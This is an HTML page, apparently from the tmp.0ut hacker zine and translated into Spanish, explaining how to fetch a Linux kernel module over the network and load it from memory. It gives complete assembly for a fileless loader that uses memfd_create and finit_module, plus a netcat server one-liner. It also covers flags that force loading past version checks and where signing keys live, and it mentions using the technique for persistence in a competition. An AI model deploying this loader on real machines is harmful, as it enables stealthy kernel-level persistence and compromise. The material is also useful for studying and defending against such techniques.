@@ -1,0 +1,331 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+/*
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+*/
+       pre { font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<!-- 20210425 Translation: Axel Monroy @_eltuerto_ -->
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                   █   │
+Cargando módulos de kernel en memoria                  │                   █   │
+~ netspooky                                            └───────────────────█ ──┘
+
+
+Debido a que algunos cambios al kernel de Linux el año pasado destruyeron la 
+antigua metodología de x86_64 "binary golf", pensé que sería divertido platicar 
+un poco acerca de una técnica para cargar módulos de kernel (LKM) desde fuentes 
+remotas. Discutiremos dos syscalls útiles para su cargador de LKMs, así como de 
+cosas a considerar cuando se usa esta metodología.
+
+───[ Compilando un módulo de kernel ]───────────────────────────────────────────
+
+Empecemos por compilar un módulo de kernel sencillo para probar. Todo lo que 
+hace es imprimir un mensaje al buffer de anillo del kernel (se puede ver con el 
+comando `dmesg`).
+
+    // bang.c
+    #include &lt;linux/module.h&gt;
+    #include &lt;linux/init.h&gt;
+    
+    MODULE_LICENSE("GPL");
+    
+    static int __init he(void) {
+        printk(KERN_INFO"we out here :}\n");
+        return 0;
+    }
+    
+    static void __exit le(void) {
+        printk(KERN_INFO"we are no longer out here :{\n");
+    }
+    
+    module_init(he);
+    module_exit(le);
+
+Un Makefile sencillo para compilarlo.
+
+    obj-m += bang.o
+    dir = $(shell uname -rm | sed -e 's/\s/\-/')
+    
+    all:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+    
+    strip: all
+        strip bang.ko
+        mkdir -p $(dir)
+        cp -v bang.ko $(dir)/he.ko
+    
+    load: all
+        sudo insmod bang.ko
+    
+    unload:
+        sudo rmmod bang
+    
+    clean:
+        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+Para compilar, sólo hay que correr `make`.
+
+Se inicia el servidor en el puerto 42000 con `cat bang.ko | nc -k -lvp 42000`
+
+───[ El cargador ]──────────────────────────────────────────────────────────────
+
+El cargador que usaremos es relativamente simple, pero lo voy a explicar en 
+detalle para que sirva de desarrollo para quienes están aprendiendo estas 
+técnicas.
+
+Vamos a descargar este módulo a un archivo en memoria. Así que comencemos por 
+crear un socket hacia nuestro servidor (127.0.0.1:42000) que sirva nuestro 
+módulo de kernel. Después crearemos un archivo memfd para descargar el módulo 
+deseado.
+
+La syscal memfd_create fue creada como una forma de tener archivos temporales 
+que no están asociados a ningún sistema de archivos. Son una forma conveniente 
+de escribir a un archivo que sólo existe por la duración del programa y da el 
+beneficio de tener tanto la dirección de un archivo temporal como un descriptor 
+de archivo.
+
+Podemos ver un ejemplo de un archivo memfd de /proc/self/fd/4 en:
+  https://github.com/netspooky/golfclub/blob/master/linux/dl_memfd_219.asm#L100
+
+Una vez que tenemos nuestro archivo memfd, leemos del buffer del socket del 
+servidor remoto y lo escribimos a nuestro descriptor de archivo.
+
+Después de que el archivo se haya descargado a nuestro descriptor memfd, usamos 
+la syscall finit_module para cargar el módulo de kernel usando este descriptor 
+de archivo.
+
+───[ kl.asm ]───────────────────────────────────────────────────────────────────
+
+;-- Descarga un módulo de kernel de 127.0.0.1:42000 a memoria y lo carga ---//--
+;  __  __ .   __  __  __  __ .  .  . configurar:
+; |  ||__||_ |__ |__||  ||  ||_/|  |   $ cat somekernelmodule.ko | nc -lvp 42000
+; |  ||   |     ||   |o ||o ||\ |__| compilar:
+; |  ||__ |__ __||   |__||__|| \ __|   $ nasm -f elf64 kl.asm ; ld kl.o -o kl
+;-------------------------------------------------------------------------------
+section .text
+global _start
+_start:
+; socket -----------------------------------------------------------------------
+; Configuración del socket
+; int socket(int domain, int type, int protocol);
+;  rdi = int domain
+;  rsi = int type
+;  rdx = int protocol 
+;-------------------------------------------------------------------------------
+  push byte 0x29               ; Apila el número de la syscall socket
+  pop rax                      ; RAX = socket syscall
+  push byte 0x2                ; Push domain: AF_INET
+  pop rdi                      ; RDI = AF_INET
+  push byte 0x1                ; Apila el tipo: SOCK_STREAM
+  pop rsi                      ; RSI = SOCK_STREAM
+  cdq                          ; RDX = 0
+  syscall                      ; Ejecuta la syscall socket
+; connect ----------------------------------------------------------------------
+; Nos conectamos a nuestro servidor para obtener el buffer del archivo
+; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+;  rdi = int sockfd
+;  rsi = const struct sockaddr *addr
+;  rdx = socklen_t addrlen
+;-------------------------------------------------------------------------------
+  xchg rdi, rax                ; int sockfd
+  mov rbx, rdi                 ; Guarda sockfd en rbx también para después
+  mov dword [rsp-4], 0x100007F ; Nuestra IP   = 127.0.0.1
+  mov word  [rsp-6], 0x10A4    ; Nuestro Puerto = 42000
+  mov byte  [rsp-8], 0x02      ; sockfd
+  sub rsp, 8                   ; Alineamiento
+  push byte 0x2a               ; Apila el número de la syscall connect
+  pop rax                      ; RAX = connect syscall
+  mov rsi, rsp                 ; const struct sockaddr *addr
+  push byte 0x10               ; longitud
+  pop rdx                      ; longitud -> rdx
+  syscall                      ; Ejecuta la syscall connect
+; memfd_create -----------------------------------------------------------------
+; Creamos un archivo virtual en donde guardar el buffer de nuestro socket.
+; int memfd_create(const char *name, unsigned int flags);
+;  rdi = const char *pathname
+;  rsi = int flags
+;-------------------------------------------------------------------------------
+  mov ax, 0x13f                ; El número de la syscall
+  push 0x474e4142              ; Nombre de archivo BANG (GNAB aquí)
+  mov rdi, rsp                 ; Arg0: El nombre del archivo
+  xor rsi, rsi                 ; int flags
+  syscall                      ; Ejecuta la syscall memfd_create
+; read -------------------------------------------------------------------------
+; Leemos el buffer del socket a un buffer para guardarlo como un archivo local
+; ssize_t read(socket sockfd,buf,len)
+;  rdi = int fd  
+;  rsi = void *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov r9, rax                  ; Guarda el descriptor de archivo local
+  mov rdx, 0x400               ; size_t count = 1024 bytes 
+rwloop:
+  mov rdi, rbx                 ; Almacena sockFD en RDI
+  xor rax, rax                 ; 0 es la syscall read
+  lea rsi, [rsp-1024]          ; buffer para guardar la salida - arg1 *buf
+  syscall                      ; Ejecuta la syscall read
+; write ------------------------------------------------------------------------
+; Escribimos el buffer del socket a nuestro archivo local
+; ssize_t sys_write(fd,*buf,count)
+;  rdi = int fd  
+;  rsi = const *buf 
+;  rdx = size_t count     
+;-------------------------------------------------------------------------------
+  mov rdi, r9                  ; Copia el descriptor desde nuestro archivo local
+  mov rdx, rax                 ; RDX = # de bytes leídos, 0 es fin de archivo
+  xor rax, rax                 ; RAX = 0
+  mov al, 1                    ; Número de syscall
+  syscall                      ; Ejecuta la syscall write
+  cmp dx, 0x400                ; Verifica si todavía hay bytes para leer
+  je rwloop                    ; Regresa al ciclo si los hay
+; finit_module -----------------------------------------------------------------
+; Carga el módulo de kernel usando un descriptor de archivo
+; int finit_module(int fd, const char *param_values, int flags);
+;  rdi = int fd - El descriptor de archivo
+;  rsi = const char *param_values
+;  rdx = int flags
+;-------------------------------------------------------------------------------
+  xor rax, rax                 ; RAX = 0
+  push rax                     ; param_values
+  mov rsi, rsp                 ; RSI = *param_values
+  mov rax, 0x139               ; Número de la syscall finit_module 
+  mov rdi, r9                  ; int fd
+  xor rdx, rdx                 ; int flags 
+  syscall                      ; Ejecuta la syscall finit_module
+;--- Exit ----------------------------------------------------------------------
+; void exit(int status);
+;  rdi = int status
+;-------------------------------------------------------------------------------
+  mov rax, 0x3c                ; Número de la syscall exit
+  mov rdi, 0x45                ; Retorna 69 como chequeo de integridad
+  syscall                      ; ¡Listo, terminado!
+
+───[ Banderas para finit_module ]───────────────────────────────────────────────
+
+La syscal finit_modules es una forma interesante de cargar un módulo de kernel 
+en Linux. Normalmente la syscall init_module carga un módulo desde un puntero en
+memoria. La syscall finit_module carga un módulo de kernel desde un descriptor 
+de archivo y también tiene formas únicas de alterar los chequeos hechos antes de 
+cargar la imagen del módulo. NOTA: las banderas de finit_module sólo se pueden 
+usar si el kernel fue compilado con la opción de permitir carga forzada. (Ver la
+siguiente sección con los detalles)
+
+Las banderas para alterar la funcionalidad están en include/uapi/linux/module.h,
+se les hace la operación OR y se pasan a la syscall en RDX.
+
+    /* Banderas para sys_finit_module: */
+    #define MODULE_INIT_IGNORE_MODVERSIONS  1
+    #define MODULE_INIT_IGNORE_VERMAGIC     2
+
+La bandera MODULE_INIT_IGNORE_MODVERSIONS ignora los hashes de los símbolos de 
+versionamiento y la bandera MODULE_INIT_IGNORE_VERMAGIC ignora el número mágico 
+de la versión del kernel en el módulo. Estas dos banderas pueden ser usadas para
+forzar la carga del módulo en el kernel. De otra forma hubiera sido rechazado. 
+¡Esto puede causar comportamiento indefinido y provocar una falla en el kernel, 
+así que deben ser usadas con cautela!
+
+finit_module describe esta funcionalidad como:
+
+  ..útil cuando la autenticidad de un módulo de kernel puede ser determinada por 
+  su ubicación en el sistema de archivos. En los casos en que esto es posible,
+  el costo adicional de utilizar módulos criptográficamente firmados para 
+  determinar su autenticidad puede ser eliminado.
+
+  - man 2 finit_module
+
+───[ Determinando la compatibilidad ]───────────────────────────────────────────
+
+Lo complicado de cargar módulos de kernel en general es que hay muchas 
+configuraciones que pueden permitir o no ciertos tipos de módulos, o distintas 
+formas de cargarlos. Estas son algunas de las banderas de configuración que hay
+que conocer antes de cargar un módulo.
+
+::: CONFIG_MODVERSIONS :::
+
+Si se especifica (ej. CONFIG_MODVERSIONS=y) entonces se pueden cargar módulos
+compilados para versiones de kernel distintas.
+
+Para verificar: 
+
+  $ grep CONFIG_MODVERSIONS /boot/config-VERSIONDELKERNEL
+  CONFIG_MODVERSIONS=y
+
+Más información: https://cateee.net/lkddb/web-lkddb/MODVERSIONS.html
+
+::: CONFIG_MODULE_SIG_FORCE :::
+
+Si se especifica entonces no se pueden cargar módulos sin firma.
+
+Para verificar:
+
+  $ grep CONFIG_MODULE_SIG_FORCE /boot/config-VERSIONDELKERNEL
+  # CONFIG_MODULE_SIG_FORCE is not set
+
+Más información: https://cateee.net/lkddb/web-lkddb/MODULE_SIG_FORCE.html
+
+PROTIP: Se pueden enumerar las llaves confiables en el sistema dependiendo del 
+sistema que se esté utilizando.
+
+Ejemplos:
+
+  /var/lib/shim-signed/mok/MOK.priv & /var/lib/shim-signed/mok/MOK.der 
+  /usr/src/LINUX/certs/signing_key.pem & /usr/src/LINUX/certs/signing_key.x509
+
+::: CONFIG_MODULE_FORCE_LOAD :::
+
+Si se especifica entonces se permite cargar módulos sin información de 
+versionamiento. Este debe especificarse si se pretenden utilizar las banderas de
+finit_module. Si no se especifica y se utilizan las banderas para alterar el 
+comportamiento, fallará con el error ENOEXEC.
+
+Para verificar: 
+
+  $ grep CONFIG_MODULE_FORCE_LOAD /boot/config-VERSIONDELKERNEL
+  # CONFIG_MODULE_FORCE_LOAD is not set
+
+Más información: https://cateee.net/lkddb/web-lkddb/MODULE_FORCE_LOAD.html
+
+───[ .fini ]────────────────────────────────────────────────────────────────────
+
+Hemos utilizado esta técnica para hacer golfeo de módulos de kernel y probar el
+cargador. También fue utilizado en el WRCCDC en forma de un "one-liner" que fue 
+útil para establecer persistencia en varias máquinas configuradas de la misma 
+manera.
+
+Este es sólo uno de tantos ejemplos para cargar un módulo de kernel. ¡Hay mucho 
+más por explorar y espero que esto les inspire a curiosear!
+
+Un saludo a todos en tmp.Out, thugcrowd, vxug, tcpd
+
+P.D. ¡Esperen un nuevo artículo acerca de "mangling" de binarios ELF en las
+próximas ediciones de tmp.Out!
+
+</pre></div></center></body></html>
